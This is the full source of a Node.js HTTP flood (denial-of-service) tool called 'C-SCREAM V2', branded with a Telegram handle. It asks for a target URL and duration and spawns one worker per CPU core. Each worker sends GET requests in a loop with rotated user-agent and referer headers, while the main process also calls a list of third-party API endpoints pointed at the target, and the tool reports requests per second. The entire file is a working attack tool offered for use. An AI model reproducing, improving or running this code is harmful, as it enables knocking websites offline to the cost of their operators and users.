// c-scream-v2.js
const axios = require('axios');
const fs = require('fs');
const chalk = require('chalk');
const gradient = require('gradient-string');
const readline = require('readline-sync');
const cluster = require('cluster');
const os = require('os');

// === FILES ===
const uaList = fs.readFileSync('./ua.txt', 'utf-8').split('\n').filter(Boolean);
const refererList = fs.readFileSync('./r.txt', 'utf-8').split('\n').filter(Boolean);
const apiList = fs.readFileSync('./vercel.txt', 'utf-8').split('\n').filter(Boolean);

// === INPUT ===
console.clear();
console.log(gradient.vice('OS-SHARK | ') + gradient.atlas('C-SCREAM V2') + chalk.white(' - T.ME/STSVKINGDOM'));

const target = readline.question('[TARGET] > ');
const duration = parseInt(readline.question('[DURATION (seconds)] > '), 10) * 1000;

// === GLOBAL STATS ===
let totalSent = 0;
let success = 0;
let failed = 0;
let peakRPS = 0;
let currentHostResponse = 0;

let startTime = Date.now();
let endTime = startTime + duration;

const maxCPUs = os.cpus().length;
const instances = maxCPUs;

function randomLine(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

// === ATTACK FUNCTION ===
async function sendRequest() {
    const headers = {
        'User-Agent': randomLine(uaList),
        'Referer': randomLine(refererList)
    };

    try {
        const res = await axios.get(target, { headers, timeout: 5000 });
        success++;
        currentHostResponse = res.status;
    } catch (err) {
        failed++;
        currentHostResponse = err.response?.status || 0;
    } finally {
        totalSent++;
    }
}

// === API TRIGGER ===
function triggerApis() {
    const urlList = apiList.map(url => url.replace('[replace]', encodeURIComponent(target)));
    const iphoneUA = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1';

    const headers = {
        'User-Agent': iphoneUA
    };

    urlList.forEach(url => {
        axios.get(url, { headers }).catch(() => {});
    });
}

// === LOGGER ===
function startLogger() {
    const interval = setInterval(() => {
        const timeLeft = Math.max(0, Math.floor((endTime - Date.now()) / 1000));
        const rps = totalSent / ((Date.now() - startTime) / 1000);
        if (rps > peakRPS) peakRPS = rps;

        console.clear();
        console.log(gradient.vice('OS-SHARK | ') + gradient.atlas('C-SCREAM V2') + chalk.white(' - T.ME/STSVKINGDOM'));
        console.log(chalk.white('========================================'));
        console.log(chalk.white(`total sent: ${totalSent}`));
        console.log(chalk.white(`success: ${success}`));
        console.log(chalk.white(`failed: ${failed}`));
        console.log(chalk.white('========================================'));
        console.log(chalk.white(`Duration left: ${timeLeft}s`));
        console.log(chalk.white('========================================'));
        console.log(chalk.white(`HOST: ${currentHostResponse}`));

        if (Date.now() >= endTime) {
            clearInterval(interval);
            endLogger();
        }
    }, 3000);
}

// === FINAL LOG ===
function endLogger() {
    console.clear();
    console.log(gradient.vice('OS-SHARK | ') + gradient.atlas('C-SCREAM V2') + chalk.white(' - T.ME/STSVKINGDOM'));
    console.log(chalk.white('========================================'));
    console.log(chalk.white(`total sent: ${totalSent}`));
    console.log(chalk.white(`success: ${success}`));
    console.log(chalk.white(`failed: ${failed}`));
    console.log(chalk.white('========================================'));
    console.log(chalk.white(`peak rq/s: ${Math.floor(peakRPS)}`));
    console.log(chalk.white('========================================'));
    console.log(chalk.white(`HOST: ${currentHostResponse}`));
    process.exit(0);
}

// === CLUSTER CONTROL ===
if (cluster.isPrimary) {
    startLogger();
    const apiInterval = setInterval(triggerApis, Math.floor(Math.random() * 2000) + 3000);

    for (let i = 0; i < instances; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        clearInterval(apiInterval);
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
    }, duration);
} else {
    const attackLoop = async () => {
        while (Date.now() < endTime) {
            await sendRequest();
        }
    };
    attackLoop();
}
